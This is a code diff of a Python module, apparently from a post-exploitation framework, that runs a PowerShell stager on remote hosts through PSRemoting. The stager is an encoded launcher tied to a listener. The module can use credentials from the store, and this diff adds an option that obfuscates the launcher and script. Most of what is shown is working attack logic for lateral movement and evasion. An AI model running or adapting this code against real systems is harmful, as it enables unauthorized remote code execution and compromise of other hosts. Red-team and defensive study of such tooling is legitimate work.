@@ -14,13 +14,13 @@ class Module:
             'Background' : False,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : True,
 
             'MinPSVersion' : '2',
-            
+
             'Comments': []
         }
 
@@ -36,7 +36,7 @@ class Module:
             'CredID' : {
                 'Description'   :   'CredID from the store to use.',
                 'Required'      :   False,
-                'Value'         :   ''                
+                'Value'         :   ''
             },
             'ComputerName' : {
                 'Description'   :   'Host[s] to execute the stager on, comma separated.',
@@ -86,8 +86,8 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
-        
+    def generate(self, obfuscate=False, obfuscationCommand=""):
+
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
@@ -100,7 +100,7 @@ class Module:
         # if a credential ID is specified, try to parse
         credID = self.options["CredID"]['Value']
         if credID != "":
-            
+
             if not self.mainMenu.credentials.is_credential_valid(credID):
                 print helpers.color("[!] CredID is invalid!")
                 return ""
@@ -118,8 +118,8 @@ class Module:
 
         else:
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
-                
+            launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, obfuscate=obfuscate, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+
             if launcher == "":
                 return ""
             else:
@@ -133,5 +133,10 @@ class Module:
                     script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+userName+"\",$PSPassword);" + script + " -Credential $Credential"
 
                 script += ";'Invoke-PSRemoting executed on " +computerNames +"'"
-            
-            return script
+
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+        return script
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
